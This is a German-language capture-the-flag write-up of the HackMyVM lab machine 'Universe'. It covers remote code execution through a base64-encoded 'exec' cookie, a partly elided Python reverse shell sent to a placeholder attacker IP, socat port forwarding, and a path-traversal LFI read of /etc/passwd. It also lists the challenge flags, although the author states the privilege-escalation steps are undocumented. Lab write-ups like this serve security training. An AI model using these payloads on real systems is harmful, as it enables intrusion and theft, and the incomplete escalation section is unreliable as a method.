# Universe - HackMyVM (Hard)
 
![Universe.png](Universe.png)

## Übersicht

*   **VM:** Universe
*   **Plattform:** HackMyVM (https://hackmyvm.eu/machines/machine.php?vm=Universe)
*   **Schwierigkeit:** Hard
*   **Autor der VM:** DarkSpirit
*   **Datum des Writeups:** 28. März 2024
*   **Original-Writeup:** https://alientec1908.github.io/Universe_HackMyVM_Hard/
*   **Autor:** Ben C.

## Kurzbeschreibung

Das Ziel der "Universe"-Challenge war die Erlangung von User- und Root-Rechten. Der Weg begann mit der Enumeration einer Python-Webanwendung (Werkzeug/Python) auf Port 1212. Im HTML-Quellcode wurde ein Hinweis auf ein Hintergrundbild `/static/universe.jpg` gefunden. Die Analyse dieser Bilddatei mit `strings` offenbarte einen `exec`-Cookie mit dem Base64-kodierten Wert `aWQ=`. Nach Dekodierung zu `id` wurde dieser Cookie verwendet, um Remote Code Execution (RCE) auf der Webanwendung zu erlangen (der Cookie-Wert wurde Base64-dekodiert und als Shell-Befehl ausgeführt). Dies führte zu einer Reverse Shell als Benutzer `miwa`. Als `miwa` wurde ein interner Dienst auf `localhost:8080` identifiziert. Mittels Port Forwarding (`socat`) wurde dieser Dienst extern zugänglich gemacht. Die interne Anwendung war anfällig für Local File Inclusion (LFI) über den `file`-Parameter. Der genaue Weg zur Privilegieneskalation von `miwa` zum Benutzer `void` (dessen User-Flag gefunden wurde) und anschließend zu `root` ist im bereitgestellten Log nicht vollständig dokumentiert, aber es wird angenommen, dass die LFI-Schwachstelle dabei eine Rolle spielte.

## Disclaimer / Wichtiger Hinweis

Die in diesem Writeup beschriebenen Techniken und Werkzeuge dienen ausschließlich zu Bildungszwecken im Rahmen von legalen Capture-The-Flag (CTF)-Wettbewerben und Penetrationstests auf Systemen, für die eine ausdrückliche Genehmigung vorliegt. Die Anwendung dieser Methoden auf Systeme ohne Erlaubnis ist illegal. Der Autor übernimmt keine Verantwortung für missbräuchliche Verwendung der hier geteilten Informationen. Handeln Sie stets ethisch und verantwortungsbewusst.

## Verwendete Tools

*   `arp-scan`
*   `vi`
*   `nmap`
*   `grep`
*   `nikto`
*   `wget`
*   `strings`
*   `stegseek`
*   `curl`
*   `echo`
*   `base64`
*   `nc` (Netcat)
*   `python3` (für Reverse Shell und `http.server`)
*   `find`
*   `ss`
*   `which`
*   `socat`
*   `cp`
*   `cat`
*   `ls`
*   `cd`
*   Standard Linux-Befehle (`id`, `stty`)

## Lösungsweg (Zusammenfassung)

Der Angriff auf die Maschine "Universe" gliederte sich in folgende Phasen:

1.  **Reconnaissance & Web Enumeration (Port 1212):**
    *   IP-Findung mit `arp-scan` (`192.168.2.107`). Eintrag von `universe.hmv` in `/etc/hosts`.
    *   `nmap`-Scan identifizierte offene Ports: 21 (FTP - vsftpd 3.0.3), 22 (SSH - OpenSSH 9.2p1), 1212 (Python/Werkzeug Webanwendung).
    *   `nikto` auf Port 1212 fand eine potenzielle Konfigurationsdatei `/cfg/CFGConnectionParams.txt` (Zugriff nicht weiter verfolgt) und bestätigte einen Redirect mit `user`-Parameter.
    *   Manuelle Untersuchung von `http://universe.hmv:1212/` zeigte ein Hintergrundbild `/static/universe.jpg`.

2.  **Steganography / Cookie Analysis & RCE:**
    *   Download von `universe.jpg`.
    *   `strings universe.jpg -n 8` fand den Hinweis `'Cookie exec: aWQ='`. `stegseek` auf das Bild war erfolglos.
    *   Dekodierung von `aWQ=` zu `id`.
    *   Aufruf von `http://universe.hmv:1212/?user=9` mit dem Header `Cookie: exec=aWQ=` führte den `id`-Befehl aus und zeigte die Ausgabe `uid=1000(miwa)...`. Dies bestätigte RCE über den `exec`-Cookie.
    *   Andere Befehle (`ls`, `ls /home`) wurden erfolgreich via Cookie ausgeführt.

3.  **Initial Access (Reverse Shell als `miwa`):**
    *   Ein Python3-Reverse-Shell-Payload (`python3 -c 'import socket,subprocess,os;s=socket.socket(...);s.connect(("[Angreifer-IP]",4444));...'`) wurde Base64-kodiert.
    *   Der kodierte Payload wurde als Wert des `exec`-Cookies an die Webanwendung gesendet.
    *   Ein `nc`-Listener auf dem Angreifer-System (Port 4444) empfing eine Reverse Shell als Benutzer `miwa`.

4.  **Internal Service Discovery, Port Forwarding & LFI:**
    *   Als `miwa` zeigte `ss -altpn` einen Dienst, der auf `127.0.0.1:8080` lauschte.
    *   `socat` wurde vom Angreifer-System auf das Zielsystem (`/tmp/socat`) heruntergeladen.
    *   Port Forwarding wurde eingerichtet: `/tmp/socat TCP-LISTEN:8000,fork TCP4:127.0.0.1:8080 &`.
    *   Der interne Dienst (erreichbar über `http://192.168.2.107:8000/`) zeigte eine Seite mit dem Text "Void Love Shine Sadness" und akzeptierte einen `file`-Parameter.
    *   Eine Local File Inclusion (LFI)-Schwachstelle wurde bestätigt durch Aufruf von `http://192.168.2.107:8000/?file=....//....//....//....//etc/passwd`, was den Inhalt von `/etc/passwd` (Benutzer `root`, `miwa`, `void` sichtbar) preisgab.

5.  **Privilege Escalation (zu `void` und `root`):**
    *   *Der genaue Weg zur Eskalation von `miwa` zum Benutzer `void` (dessen User-Flag gefunden wurde) und anschließend zu `root` ist im bereitgestellten Log nicht vollständig dokumentiert.*
    *   Es wird angenommen, dass die LFI-Schwachstelle auf Port 8000 oder andere, nicht gezeigte Methoden für diese Eskalationsschritte genutzt wurden.
    *   User-Flag (für `void`): `void{70zHEmM1WJL0jjm2WBorHVEQj}` wurde gefunden (Pfad `/home/void/user.txt` angenommen).
    *   Root-Flag: `root{k7Ei4kA88gtL957yYbWdRfVJg}` wurde gefunden (Pfad `/root/root.txt` angenommen).

## Wichtige Schwachstellen und Konzepte

*   **RCE via Cookie:** Der Wert eines Cookies (`exec`) wurde Base64-dekodiert und als Shell-Befehl ausgeführt.
*   **Informationsleck in Bilddatei (Steganographie/Strings):** Ein Hinweis auf den verwundbaren Cookie wurde in einer Bilddatei gefunden.
*   **Local File Inclusion (LFI) in interner Anwendung:** Ein interner Dienst (zugänglich gemacht durch Port Forwarding) war anfällig für LFI.
*   **Port Forwarding (socat):** Ermöglichte den Zugriff auf einen nur lokal lauschenden Dienst.
*   **Python Web Framework (Werkzeug):** Die Anwendung auf Port 1212 basierte auf Werkzeug/Python.

## Flags

*   **User Flag (`/home/void/user.txt` angenommen):** `void{70zHEmM1WJL0jjm2WBorHVEQj}` (Erlangungsmethode von `miwa` zu `void` nicht detailliert)
*   **Root Flag (`/root/root.txt` angenommen):** `root{k7Ei4kA88gtL957yYbWdRfVJg}` (Erlangungsmethode nicht detailliert)

## Tags

`HackMyVM`, `Universe`, `Hard`, `RCE`, `Cookie Manipulation`, `Base64`, `Steganography`, `LFI`, `Python`, `Werkzeug`, `socat`, `Port Forwarding`, `Privilege Escalation` (teilweise)
